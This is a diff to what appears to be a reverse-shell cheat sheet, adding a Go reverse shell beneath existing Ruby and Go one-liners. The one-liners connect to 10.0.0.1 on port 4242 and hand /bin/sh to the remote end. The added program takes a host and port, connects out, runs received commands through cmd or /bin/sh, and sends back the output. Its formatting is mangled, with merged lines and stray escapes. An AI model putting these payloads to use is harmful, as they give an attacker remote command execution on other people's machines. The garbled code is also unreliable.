@@ -161,6 +161,52 @@ ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.cho
 ```shell
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
+```
+package mainimport (  
+ "bufio"  
+ "flag"  
+ "fmt"  
+ "net"  
+ "os"  
+ "os/exec"  
+ "runtime"  
+)func get\_arch\_message_format(msg string) (string, \[\]string) {  
+ var exe string  
+ os := runtime.GOOS  
+ switch os {  
+ case "windows":  
+  exe = "cmd"  
+ case "linux":  
+  exe = "/bin/sh"  
+ }  
+ args := \[\]string{}  
+ if exe == "cmd" {  
+  args = append(args, "/C")  
+ } else {  
+  args = append(args, "-c")  
+ }  
+ args = append(args, msg)  
+ return exe, args  
+}func main() {args := os.Args  
+ if len(args) < 2 {  
+  fmt.Println("Not enough arguments!")  
+  fmt.Println("Usage: app -i 10.10.10.10 -p 8089")  
+  return  
+ }I_P := flag.String("i", "", "Host to connect to")  
+ L_PORT := flag.String("p", "", "Port to listen on")  
+ flag.Parse()conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", \*I\_P, \*L\_PORT))for {  
+  cwd, _ := os.Getwd()  
+  fmt.Fprintf(conn, "\\n%s> ", cwd)  
+  msg, _ := bufio.NewReader(conn).ReadString('\\n')  
+  exe, args := get\_arch\_message_format(msg)  
+  out, err := exec.Command(exe, args...).Output()  
+  if err != nil {  
+   fmt.Println(conn, "\\n\\n%s\\n", err)  
+  }  
+  fmt.Fprintf(conn, "%s", out)  
+ }  
+}
+```
 ## Java
 ```java
 Runtime r = Runtime.getRuntime();
